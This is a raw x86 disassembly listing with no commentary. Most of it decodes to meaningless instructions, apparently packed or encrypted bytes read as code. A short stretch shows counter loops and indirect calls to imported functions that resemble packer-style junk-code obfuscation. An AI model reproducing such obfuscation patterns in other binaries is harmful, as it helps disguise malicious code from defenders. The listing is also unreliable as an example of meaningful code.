  40a1da:	pop    esi
  40a1db:	mov    BYTE PTR [ecx+0x534e0d9e],cl
  40a1e1:	xor    eax,0x127f45e7
  40a1e6:	inc    edx
  40a1e7:	inc    esi
  40a1e8:	sub    al,0x26
  40a1ea:	aas    
  40a1eb:	test   eax,0xb706d287
  40a1f0:	gs dec esp
  40a1f2:	das    
  40a1f3:	and    al,0x57
  40a1f5:	iret   
  40a1f6:	out    0x33,al
  40a1f8:	loope  0x40a203
  40a1fa:	add    cl,BYTE PTR [esi-0x28]
  40a1fd:	int    0x82
  40a1ff:	push   es
  40a200:	mov    esp,0x86e9b702
  40a205:	loop   0x40a247
  40a207:	bound  edx,QWORD PTR ds:0xd32b3590
  40a20d:	jno    0x40a276
  40a20f:	arpl   dx,bx
  40a211:	jg     0x40a271
  40a213:	cmp    BYTE PTR [esi],al
  40a215:	pop    ebp
  40a216:	je     0x40a1ea
  40a218:	add    al,0x2e
  40a21a:	dec    esi
  40a21b:	retf   
  40a21c:	test   esi,edi
  40a21e:	daa    
  40a21f:	stc    
  40a220:	aam    0x18
  40a222:	loop   0x40a25f
  40a224:	pop    ecx
  40a225:	sbb    eax,0x623b1d6d
  40a22a:	sbb    DWORD PTR [eax],esi
  40a22c:	jb     0x40a25f
  40a22e:	or     edi,esi
  40a230:	add    cl,BYTE PTR [ebx+0x7d]
  40a233:	pop    ebp
  40a234:	mov    ebp,DWORD PTR [ecx-0x78]
  40a237:	mov    dh,bh
  40a239:	xor    ebp,edi
  40a23b:	loopne 0x40a28c
  40a23d:	push   0xffffffb2
  40a23f:	sar    BYTE PTR [ebx],0xcd
  40a242:	xchg   ecx,eax
  40a243:	test   al,0x81
  40a245:	retf   0xc9bf
  40a248:	out    dx,al
  40a249:	cwde   
  40a24a:	sbb    al,0x8c
  40a24c:	push   esi
  40a24d:	in     eax,dx
  40a24e:	in     al,0x17
  40a250:	fcmovnu st,st(7)
  40a252:	out    0xf8,eax
  40a254:	pop    ss
  40a255:	cmp    ebx,0xffffff9b
  40a258:	(bad)  
  40a259:	in     eax,dx
  40a25a:	loope  0x40a29a
  40a25c:	jnp    0x40a291
  40a25e:	jle    0x40a2ce
  40a260:	or     BYTE PTR [esi],dl
  40a262:	pop    ebx
  40a263:	cdq    
  40a264:	out    dx,eax
  40a265:	mov    al,ds:0x4a74a89f
  40a26a:	call   0x6fab7e56
  40a26f:	dec    eax
  40a270:	jno    0x40a203
  40a272:	add    BYTE PTR [eiz*1+0x2988a5f2],0xe
  40a27a:	pop    ebp
  40a27b:	iret   
  40a27c:	pushf  
  40a27d:	mov    al,0xa6
  40a27f:	ds xchg ecx,eax
  40a281:	cmp    esp,esp
  40a283:	sub    BYTE PTR ds:0xb924c90,ch
  40a289:	push   ebp
  40a28a:	call   0xf41c:0xde8dddb5
  40a291:	jno    0x40a244
  40a293:	shl    BYTE PTR [ebp-0x9e9f494],0x2b
  40a29a:	mov    dh,0xbd
  40a29c:	in     eax,0x56
  40a29e:	retf   
  40a29f:	pop    edi
  40a2a0:	imul   esi,DWORD PTR [ebp+0x63],0x7e
  40a2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2a5:	jg     0x40a2a1
  40a2a7:	sti    
  40a2a8:	add    al,BYTE PTR [ebx]
  40a2aa:	mov    bl,0xd2
  40a2ac:	or     DWORD PTR [ecx],0x38b2a44e
  40a2b2:	push   0x57
  40a2b4:	mov    bl,0xe6
  40a2b6:	sbb    al,0x9a
  40a2b8:	sub    eax,0x6b3730
  40a2bd:	retf   
  40a2be:	out    0xfc,al
  40a2c0:	pop    edx
  40a2c1:	sbb    DWORD PTR [esi+esi*4+0x6f9a623d],edi
  40a2c8:	add    eax,edi
  40a2ca:	jl     0x40a337
  40a2cc:	les    ax,DWORD PTR [esi-0x79]
  40a2d0:	inc    ecx
  40a2d1:	xchg   ebx,eax
  40a2d2:	pop    ebp
  40a2d3:	jp     0x40a2fe
  40a2d5:	nop
  40a2d6:	jns    0x40a2a1
  40a2d8:	(bad)  
  40a2d9:	out    0x62,eax
  40a2db:	das    
  40a2dc:	mov    esi,0x182d1e23
  40a2e1:	out    0x14,eax
  40a2e3:	push   ecx
  40a2e4:	sbb    eax,0xa298646e
  40a2e9:	jg     0x40a2e7
  40a2eb:	sub    BYTE PTR [ecx+0x2b86f7b1],bl
  40a2f1:	push   cs
  40a2f2:	test   eax,0x45839c55
  40a2f7:	or     BYTE PTR [edx],0x7c
  40a2fa:	add    DWORD PTR ds:0x2e6e9137,0x38
  40a301:	js     0x40a2d7
  40a303:	sar    ah,cl
  40a305:	lds    edi,FWORD PTR [ebx+ecx*1-0x1bcdd5ef]
  40a30c:	out    dx,al
  40a30d:	into   
  40a30e:	sbb    esp,DWORD PTR [edx+0x14]
  40a311:	inc    edx
  40a312:	dec    esi
  40a313:	shl    BYTE PTR [eax+eax*4-0xeeadfc0],cl
  40a31a:	cwde   
  40a31b:	cmp    eax,0x7b50a538
  40a320:	mov    esi,0x803e98a0
  40a325:	mov    eax,0x4f283ded
  40a32a:	stos   BYTE PTR es:[edi],al
  40a32b:	scas   al,BYTE PTR es:[edi]
  40a32c:	test   al,0x4a
  40a32e:	div    BYTE PTR [edx]
  40a330:	pusha  
  40a331:	inc    ecx
  40a332:	cmp    eax,0xd2ed0f34
  40a337:	loop   0x40a2f0
  40a339:	xlat   BYTE PTR ds:[ebx]
  40a33a:	jo     0x40a3ad
  40a33c:	outs   dx,DWORD PTR ds:[esi]
  40a33d:	pop    edi
  40a33e:	in     eax,0x88
  40a340:	jl     0x40a2fd
  40a342:	mov    WORD PTR [esi],?
  40a344:	daa    
  40a345:	jo     0x40a3a1
  40a347:	retf   0x2c5a
  40a34a:	jmp    0x753a:0x6b0f04f3
  40a351:	push   eax
  40a352:	les    ebx,FWORD PTR [ecx+edi*4+0x76]
  40a356:	push   esi
  40a357:	test   al,0xe9
  40a359:	enter  0x6d71,0x64
  40a35d:	fwait
  40a35e:	jl     0x40a2ea
  40a360:	cmc    
  40a361:	je     0x40a332
  40a363:	fsub   DWORD PTR [edx]
  40a365:	xor    eax,0xc63d055f
  40a36a:	repz dec edx
  40a36c:	mov    esi,0x9ac64988
  40a371:	enter  0x426f,0x39
  40a375:	or     dh,BYTE PTR [eax]
  40a377:	xor    DWORD PTR [edx+edx*1+0x10],ebp
  40a37b:	push   0xf783ffa0
  40a380:	mov    ah,0x77
  40a382:	repz mul DWORD PTR [edx+ebp*4-0x40581487]
  40a38a:	pop    eax
  40a38b:	test   al,0xcb
  40a38d:	xor    eax,0x62d431d5
  40a392:	push   es
  40a393:	sbb    al,0xfa
  40a395:	cdq    
  40a396:	mov    ah,0x5c
  40a398:	mov    DWORD PTR [esi],esp
  40a39a:	dec    ebx
  40a39b:	(bad)  
  40a39c:	data16 outs dx,BYTE PTR ds:[esi]
  40a39e:	sbb    DWORD PTR [edx],0xffffffae
  40a3a1:	das    
  40a3a2:	push   ebp
  40a3a3:	fnstsw WORD PTR [edx-0x323e883a]
  40a3a9:	pop    esp
  40a3aa:	aas    
  40a3ab:	adc    ecx,DWORD PTR [ecx]
  40a3ad:	call   0xe07e:0xf8bb10cf
  40a3b4:	stos   DWORD PTR es:[edi],eax
  40a3b5:	lahf   
  40a3b6:	sub    DWORD PTR [ebx+edi*2+0x6a],0xfffffff1
  40a3bb:	js     0x40a422
  40a3bd:	pop    esi
  40a3be:	pop    ebx
  40a3bf:	lock inc esi
  40a3c1:	push   eax
  40a3c2:	bound  ebp,QWORD PTR ds:0x21893357
  40a3c8:	sahf   
  40a3c9:	push   edx
  40a3ca:	jg     0x40a399
  40a3cc:	sub    dl,BYTE PTR [edx-0xd]
  40a3cf:	or     DWORD PTR [ebp+0x72],ebx
  40a3d2:	push   ebx
  40a3d3:	int    0x9c
  40a3d5:	cli    
  40a3d6:	sub    eax,0xaf203830
  40a3db:	aam    0xcd
  40a3dd:	pop    di
  40a3df:	imul   edx,edi,0x7081f34
  40a3e5:	adc    eax,ecx
  40a3e7:	jmp    0x4104:0xfbb185f9
  40a3ee:	or     DWORD PTR [eax],esp
  40a3f0:	adc    eax,0x7d18a354
  40a3f5:	es rol ch,1
  40a3f8:	scas   al,BYTE PTR es:[edi]
  40a3f9:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40a400:	mov    DWORD PTR [ebp-0x30],0xf89c853a
  40a407:	or     edi,edi
  40a409:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40a410:	sbb    edi,DWORD PTR ds:0x434707
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x434673,0x13
  40a427:	cmp    DWORD PTR ds:0x434673,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x434673,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43478f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x434673
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x434673,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x43477b,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x43477b
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x43477b,edx
  40a477:	cmp    DWORD PTR ds:0x43477b,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x434737
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x434a27
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x43477b,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x4346cb,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434713,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x4346d3,0x4346cf
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x4346f7,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x4346f7,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434783,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x43474b,0x4346fb
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x4346cf,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x4346cf,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x434673,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x43467b,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x43477b,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434797
  40a564:	mov    edx,DWORD PTR ds:0x4347a7
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x4346bf,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x4346bf
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x4346bf,ebx
  40a58c:	cmp    DWORD PTR ds:0x4346bf,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x4346bf,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x4346bf
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x4346bf,ebx
  40a5bc:	cmp    DWORD PTR ds:0x4346bf,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x4346ff
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x4346b7,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x4346cb,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x4346cb,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x4346cb,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x4346cb
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x4346cb,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x434747,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x4346bf,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x43473f
  40a648:	add    DWORD PTR ds:0x434793,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x4346ff,0x434787
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	sub    eax,0xfaff1d0e
  40a671:	bnd jle 0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	iret   
  40a679:	pand   mm6,QWORD PTR [ebp+0x25]
  40a67d:	mov    BYTE PTR ss:[esi+0x9],ah
  40a681:	mov    dh,0x99
  40a683:	hlt    
  40a684:	mov    al,BYTE PTR [ebx]
  40a686:	pop    ss
  40a687:	or     eax,0xce44c34a
  40a68c:	inc    ebx
  40a68d:	xor    DWORD PTR [edi-0x4a7ee047],edi
  40a693:	call   0xa34f:0x2670065b
  40a69a:	call   DWORD PTR [esi-0x4c37d30]
  40a6a0:	sub    DWORD PTR [ecx-0x6b99a1f9],edi
  40a6a6:	fisttp QWORD PTR [edx-0x62]
  40a6a9:	repz jbe 0x40a62d
  40a6ac:	frstor [eax-0x74e16007]
  40a6b2:	mov    ah,0xb6
  40a6b4:	lock ficomp WORD PTR [ecx+0x6d6c11ce]
  40a6bb:	mov    esi,0x94156201
  40a6c0:	(bad)
  40a6c3:	fldcw  WORD PTR [edi+0x6990fdee]
  40a6c9:	mov    dl,0x46
  40a6cb:	adc    al,0x41
  40a6cd:	mov    BYTE PTR [edi],0xe
  40a6d0:	add    DWORD PTR [ebx-0x586fb6a0],esp
  40a6d6:	(bad)  
  40a6d7:	int3   
  40a6d8:	xor    DWORD PTR [ebp+0x7793604],esp
  40a6de:	cmp    BYTE PTR [edi+ebx*4-0x33c36546],cl
  40a6e5:	test   BYTE PTR [esi+0x69d8129f],cl
  40a6eb:	jb     0x40a6b4
  40a6ed:	mov    bh,0x3c
  40a6ef:	push   0xffffffdf
  40a6f1:	in     al,dx
  40a6f2:	sar    BYTE PTR [ebx-0x5],cl
  40a6f5:	xchg   edi,eax
  40a6f6:	es cdq 
  40a6f8:	rcl    ah,1
  40a6fa:	loopne 0x40a6c2
  40a6fc:	arpl   WORD PTR [ecx],ax
  40a6fe:	push   es
  40a6ff:	mov    ch,0x23
  40a701:	daa    
  40a702:	dec    ebx
  40a703:	xchg   esi,eax
  40a704:	push   ds
  40a705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a706:	sub    eax,0xdb13fcc0
  40a70b:	loop   0x40a741
  40a70d:	inc    ebp
  40a70e:	mov    edi,0x7badd11d
  40a713:	stos   BYTE PTR es:[edi],al
  40a714:	ror    BYTE PTR [edx+ebp*2],1
  40a717:	out    dx,al
  40a718:	xor    bh,al
  40a71a:	jge    0x40a6d2
  40a71c:	pop    ebp
  40a71d:	mov    dl,0xe7
  40a71f:	fbld   TBYTE PTR [esi+0x6bc80af6]
  40a725:	xor    eax,0x27fe18c3
  40a72a:	sbb    al,0x1d
  40a72c:	(bad)  
  40a72d:	push   cs
  40a72e:	aam    0x50
  40a730:	or     ebp,ecx
  40a732:	pushf  
  40a733:	lds    ecx,FWORD PTR [ecx-0x703564bb]
  40a739:	jnp    0x40a74d
  40a73b:	and    DWORD PTR [ebx+0x378a2d2c],0xac5ac039
  40a745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a746:	mov    ah,0xe2
  40a748:	pop    edi
  40a749:	jb     0x40a7aa
  40a74b:	cmp    esp,DWORD PTR [edx]
  40a74d:	lods   eax,DWORD PTR ds:[esi]
  40a74e:	sub    esp,DWORD PTR [ebx+0xcbfe763]
  40a754:	nop
  40a755:	jmp    0x7a784a90
  40a75a:	fdiv   st(7),st
  40a75c:	and    BYTE PTR [ecx+0x25b952eb],bl
  40a762:	push   esp
  40a763:	repnz pop es
  40a765:	inc    esp
  40a766:	and    DWORD PTR [ebp-0x37cddf28],ebx
  40a76c:	xor    BYTE PTR [esi],ah
  40a76e:	mov    WORD PTR [edx+eiz*1-0x4c],ss
  40a772:	fist   WORD PTR [eax]
  40a774:	scas   eax,DWORD PTR es:[edi]
  40a775:	sbb    DWORD PTR [ecx],ebp
  40a777:	arpl   WORD PTR [ecx+0x58],si
  40a77a:	mov    ds:0x71ffe2f,al
  40a77f:	mov    ebx,0x5a3b3040
  40a784:	and    BYTE PTR [ebp*4-0x3100870c],cl
  40a78b:	loope  0x40a76d
  40a78d:	adc    al,0x68
  40a78f:	sbb    DWORD PTR [esi],ebp
  40a791:	sahf   
  40a792:	push   bp
  40a794:	mov    DWORD PTR [edi+0x1a79710b],ebx
  40a79a:	mov    bl,0xe
  40a79c:	jae    0x40a76b
  40a79e:	mov    eax,0x6c4fb2ed
  40a7a3:	out    0x2,eax
  40a7a5:	punpckhdq mm5,QWORD PTR [edx-0x6]
  40a7a9:	jmp    0xd21c:0xe4919da7
  40a7b0:	fcom   DWORD PTR [ebx]
  40a7b2:	xor    DWORD PTR [ebx-0x27],0xffffff95
  40a7b6:	adc    eax,0x83ca8916
  40a7bb:	push   ecx
  40a7bc:	sub    al,0xcf
  40a7be:	clc    
  40a7bf:	aad    0x88
  40a7c1:	iret   
  40a7c2:	ror    DWORD PTR [ebx-0x20],1
  40a7c5:	pop    ds
  40a7c6:	enter  0x68f4,0x53
  40a7ca:	push   ebx
  40a7cb:	sub    al,0xa
  40a7cd:	test   BYTE PTR ds:0xe748893b,dl
  40a7d3:	lahf   
  40a7d4:	repnz in al,0x96
  40a7d7:	sbb    bh,BYTE PTR [edi-0x48c2b5b2]
  40a7dd:	shl    DWORD PTR [ebx],1
  40a7df:	adc    BYTE PTR [esi],0xa3
  40a7e2:	sti    
  40a7e3:	and    al,0x62
  40a7e5:	mov    bl,0x1b
  40a7e7:	sbb    DWORD PTR [ebx],esi
  40a7e9:	scas   al,BYTE PTR es:[edi]
  40a7ea:	test   eax,0x394ad4a
  40a7ef:	xchg   dh,bl
  40a7f1:	add    eax,DWORD PTR [ecx-0xc]
  40a7f4:	fisub  DWORD PTR [edx+0x47]
  40a7f7:	xchg   edx,eax
  40a7f8:	aas    
  40a7f9:	gs push esp
  40a7fb:	sub    eax,0xda8d89ca
  40a800:	adc    BYTE PTR cs:[ecx-0x5ddf54b7],ch
  40a807:	push   edi
  40a808:	in     al,0x7c
  40a80a:	cmp    DWORD PTR [edx+0x294b1046],esp
  40a810:	sar    BYTE PTR [esi],cl
  40a812:	jbe    0x40a7cb
  40a814:	pop    ecx
  40a815:	pop    edx
  40a816:	inc    eax
  40a817:	pushf  
  40a818:	jae    0x40a7be
  40a81a:	hlt    
  40a81b:	nop
  40a81c:	push   ecx
  40a81d:	jae    0x40a818
  40a81f:	aad    0xba
  40a821:	dec    ebp
  40a822:	inc    edx
  40a823:	jnp    0x40a82e
  40a825:	sbb    al,0x1b
  40a827:	jle    0x40a88c
  40a829:	xor    al,0xd2
  40a82b:	loopne 0x40a7cb
  40a82d:	inc    edi
  40a82e:	mov    edx,0xd2eaf168
  40a833:	and    BYTE PTR [eax],ah
  40a835:	xor    esp,DWORD PTR [edx+0x61]
  40a838:	push   edx
  40a839:	or     ah,bl
  40a83b:	popf   
  40a83c:	or     al,0x28
  40a83e:	xchg   ecx,eax
  40a83f:	add    DWORD PTR [eax],ebx
  40a841:	adc    DWORD PTR [edx+edi*4],esp
  40a844:	mov    esi,0xd092e57f
  40a849:	pop    edi
  40a84a:	dec    edi
  40a84b:	dec    ecx
  40a84c:	xchg   edx,eax
  40a84d:	(bad)  
  40a84e:	and    esi,DWORD PTR [esi-0x54]
  40a851:	mov    edi,ebp
  40a853:	lds    ebx,FWORD PTR [ebx-0x5b]
  40a856:	xor    al,BYTE PTR [ebp-0x4e]
  40a859:	dec    esp
  40a85a:	std    
  40a85b:	dec    esp
  40a85c:	push   esp
  40a85d:	mov    cl,0x35
  40a85f:	add    BYTE PTR [eax],dl
  40a861:	mov    ecx,0x954e27bd
  40a866:	push   cs
  40a867:	retf   
  40a868:	mov    ch,0x33
  40a86a:	or     al,0x68
  40a86c:	sub    ecx,eax
  40a86e:	fist   WORD PTR [ecx-0x9e68913]
  40a874:	add    bh,bl
  40a876:	gs test eax,0x654d720a
  40a87c:	stos   BYTE PTR es:[edi],al
  40a87d:	out    0x51,eax
  40a87f:	call   0xcfbb1ad3
  40a884:	mov    esp,0xbc2c69ad
  40a889:	test   al,0x3a
  40a88b:	xlat   BYTE PTR ds:[ebx]
  40a88c:	fisttp QWORD PTR [esi+0x1c]
  40a88f:	out    dx,al
  40a890:	scas   al,BYTE PTR es:[edi]
  40a891:	lea    esi,[esi-0x9]
  40a894:	mov    bh,0xff
  40a896:	pop    ss
  40a897:	mov    ds:0x48b6e0d6,al
  40a89c:	out    dx,eax
  40a89d:	pop    esp
  40a89e:	xor    al,BYTE PTR [ebx]
  40a8a0:	rol    edi,1
  40a8a2:	push   esp
  40a8a3:	and    DWORD PTR [ecx],ecx
  40a8a5:	gs inc edx
  40a8a7:	xchg   edi,eax
  40a8a8:	jge    0x40a910
  40a8aa:	xchg   DWORD PTR [ecx],ecx
  40a8ac:	mov    ds:0x40ecb51d,al
  40a8b1:	test   al,0x3b
  40a8b3:	daa    
  40a8b4:	mov    al,ds:0x3cf29a78
  40a8b9:	jle    0x40a8dc
  40a8bb:	sbb    ch,bl
  40a8bd:	push   edi
  40a8be:	sub    al,BYTE PTR [ecx-0x55100c65]
  40a8c4:	mov    eax,ds:0xcb212771
  40a8c9:	jecxz  0x40a8b8
  40a8cb:	xchg   esp,eax
  40a8cc:	sahf   
  40a8cd:	pop    ss
  40a8ce:	and    eax,0x7dbe9ba
  40a8d3:	sahf   
  40a8d4:	add    ebx,eax
  40a8d6:	xchg   edx,eax
  40a8d7:	mov    al,ds:0xa2551d1
  40a8dc:	cwde   
  40a8dd:	stos   DWORD PTR es:[edi],eax
  40a8de:	int    0x51
  40a8e0:	js     0x40a918
  40a8e2:	sti    
  40a8e3:	data16 sub ah,dh
  40a8e6:	bound  edi,QWORD PTR [ebx]
  40a8e8:	sbb    eax,0xaaaea058
  40a8ed:	jb     0x40a88b
  40a8ef:	hlt    
  40a8f0:	xchg   ebx,eax
  40a8f1:	mov    edx,0xe2012aac
  40a8f6:	xor    al,0x42
  40a8f8:	inc    esp
  40a8f9:	mov    ds:0x7e578a3b,al
  40a8fe:	dec    esp
  40a8ff:	lock adc ch,BYTE PTR [edi-0x518d362]
  40a906:	inc    eax
  40a907:	cmp    ah,al
  40a909:	or     al,0xec
  40a90b:	cmp    BYTE PTR [edx+0x5f],dl
  40a90e:	adc    ebx,eax
  40a910:	push   0x4a
  40a912:	cmp    esi,eax
  40a914:	xchg   esp,eax
  40a915:	fucomp st(2)
  40a917:	xchg   ecx,eax
  40a918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a919:	cs add edx,esp
  40a91c:	lds    esp,FWORD PTR [ebx+eiz*2+0x68]
  40a920:	in     al,dx
  40a921:	pop    ds
  40a922:	lock xchg ebx,eax
  40a924:	inc    edx
  40a925:	or     dl,dl
  40a927:	jle    0x40a917
  40a929:	xor    ebx,edi
  40a92b:	mov    esp,0xd1c24376
  40a930:	scas   eax,DWORD PTR es:[edi]
  40a931:	je     0x40a8bf
  40a933:	outs   dx,BYTE PTR ds:[esi]
  40a934:	dec    edi
  40a935:	mov    ?,WORD PTR [ecx]
  40a937:	scas   al,BYTE PTR es:[edi]
  40a938:	xchg   ecx,eax
  40a939:	mov    ds:0x5d3d6ae2,al
  40a93e:	sbb    ch,bh
  40a940:	cmp    eax,DWORD PTR [ebp+ecx*4+0x45832c62]
  40a947:	xor    BYTE PTR [edi-0x5d],dh
  40a94a:	aaa    
  40a94b:	push   0x935e0e09
  40a950:	fucomi st,st(3)
  40a952:	aad    0x93
  40a954:	lock adc eax,0x169ab387
  40a95a:	inc    esi
  40a95b:	addr16 jg 0x40a921
  40a95e:	leave  
  40a95f:	pop    edi
  40a960:	add    al,0xb5
  40a962:	mov    edi,0xc2a62c17
  40a967:	push   eax
  40a968:	xchg   ebp,eax
  40a969:	pop    ecx
  40a96a:	xchg   esi,eax
  40a96b:	repz int 0xc3
  40a96e:	ss jp  0x40a949
  40a971:	mov    ebx,0xc6305685
  40a976:	jmp    0xa86316e5
  40a97b:	lods   eax,DWORD PTR ds:[esi]
  40a97c:	std    
  40a97d:	xor    eax,DWORD PTR ds:0xb3ae860e
  40a983:	push   ds
  40a984:	pop    esi
  40a985:	sub    BYTE PTR [eax-0x35],0x1f
  40a989:	cmc    
  40a98a:	scas   al,BYTE PTR es:[edi]
  40a98b:	xchg   ebx,eax
  40a98c:	inc    edi
  40a98d:	mov    ah,0x60
  40a98f:	adc    al,0x3
  40a991:	add    DWORD PTR [edi+0x5eac9996],eax
  40a997:	sbb    BYTE PTR [ecx+0x50],dh
  40a99a:	mov    bh,0xc
  40a99c:	jp     0x40a9d7
  40a99e:	(bad)  ds:0x36c0c59a
  40a9a4:	mov    WORD PTR [ebx+0x1ae1537a],ds
  40a9aa:	mov    ah,0xd7
  40a9ac:	retf   0x75e4
  40a9af:	push   ebp
  40a9b0:	sbb    eax,0xee175bc8
  40a9b5:	cmp    BYTE PTR [ecx+0x5ed802d],al
  40a9bb:	ret    0x1e7
  40a9be:	rcr    DWORD PTR [edi-0x14],0x6
  40a9c2:	pop    ds
  40a9c3:	inc    edx
  40a9c4:	xor    ah,BYTE PTR [ecx]
  40a9c6:	and    DWORD PTR [edi+0x3f352439],ebx
  40a9cc:	xor    eax,0x7aa33287
  40a9d1:	dec    esi
  40a9d2:	test   al,0xd
  40a9d4:	jge    0x40a969
  40a9d6:	repnz push 0xffffffcc
  40a9d9:	pop    es
  40a9da:	scas   eax,DWORD PTR es:[edi]
  40a9db:	jno    0x40aa50
  40a9dd:	xor    DWORD PTR [edi+edx*1],ebx
  40a9e0:	jp     0x40a9e4
  40a9e2:	xchg   esp,eax
  40a9e3:	pop    ebx
  40a9e4:	xor    eax,0x6193f9d3
  40a9e9:	popa   
  40a9ea:	mov    dl,0x6b
  40a9ec:	icebp  
  40a9ed:	test   BYTE PTR [esi],0xdc
  40a9f0:	leave  
  40a9f1:	jle    0x40a9db
  40a9f3:	jns    0x40a99b
  40a9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f7:	pop    es
  40a9f8:	stos   DWORD PTR es:[edi],eax
  40a9f9:	pop    ebx
  40a9fa:	xlat   BYTE PTR ds:[ebx]
  40a9fb:	dec    edx
  40a9fc:	punpcklbw mm5,DWORD PTR [edx]
  40a9ff:	pop    ds
  40aa00:	mul    DWORD PTR [edx+0x6]
  40aa03:	ror    edi,cl
  40aa05:	sbb    esp,DWORD PTR [eax-0x42]
  40aa08:	(bad)  
  40aa09:	fsub   DWORD PTR [ebx]
  40aa0b:	iret   
  40aa0c:	push   DWORD PTR [ecx+ecx*2]
  40aa0f:	pop    ds
  40aa10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa11:	dec    esp
  40aa12:	mov    esi,0x455999ff
  40aa17:	xchg   DWORD PTR [edi-0x75125e81],ebp
  40aa1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa1e:	pop    esi
  40aa1f:	ret    
  40aa20:	add    al,0xe0
  40aa22:	sbb    DWORD PTR [eax+0x5e],edx
  40aa25:	or     al,0x3e
  40aa27:	in     eax,dx
  40aa28:	adc    dl,BYTE PTR [edx+ebx*1]
  40aa2b:	mov    ah,0x75
  40aa2d:	(bad)  
  40aa2e:	dec    DWORD PTR [edi-0x9]
  40aa31:	dec    ebx
  40aa32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa33:	pop    ebx
  40aa34:	pop    ebx
  40aa35:	test   DWORD PTR [ebx+0x2d],eax
  40aa38:	out    dx,al
  40aa39:	sub    eax,0xcea5cc50
  40aa3e:	lock push ebx
